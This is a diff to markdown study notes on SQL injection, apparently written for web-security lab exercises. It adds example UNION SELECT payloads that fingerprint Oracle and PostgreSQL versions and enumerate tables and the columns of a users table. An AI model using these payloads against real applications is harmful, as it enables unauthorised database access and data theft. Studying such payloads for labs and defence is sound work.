@@ -23,8 +23,8 @@ hold string data by submitting a series of UNION SELECT payloads that place a st
 ## Database version
 ### You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
-- Oracle: 	`SELECT banner FROM v$version` 
-- SELECT:  `version FROM v$instance`
+- Oracle: 	`SELECT banner FROM v$version` or `SELECT version FROM v$instance`
+  > Example: `' UNION SELECT banner,NULL FROM v$version--`
 - Microsoft: 	`SELECT @@version`
 - PostgreSQL: 	`SELECT version()` 
   > Example: `'+UNION+SELECT+version()+,NULL--`
@@ -35,16 +35,21 @@ hold string data by submitting a series of UNION SELECT payloads that place a st
 
 - Oracle
   - `SELECT * FROM all_tables`
+    > Example: `' UNION SELECT TABLE_NAME,NULL FROM all_tables--`
+    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
   - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
+    > Example: `' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_QQGUCL'--`
+    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
 - Microsoft	
   - `SELECT * FROM information_schema.tables`
   - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
 - PostgreSQL	
   - `SELECT * FROM information_schema.tables`
-    > Example: `' UNION SELECT table_name,NULL FROM information_schema.tables--` *table_name* is a	sql_identifier that displays the name(s) of the table(s)
+    > Example: `' UNION SELECT table_name,NULL FROM information_schema.tables--` 
+    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
   - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` 
-    > Example: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_jrcoia'--` *column_name* is a	sql_identifier that 
-    > displays the name(s) of the column(s) under a specified table
+    > Example: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_jrcoia'--`
+    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
 - MySQL	
   - `SELECT * FROM information_schema.tables`
   - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
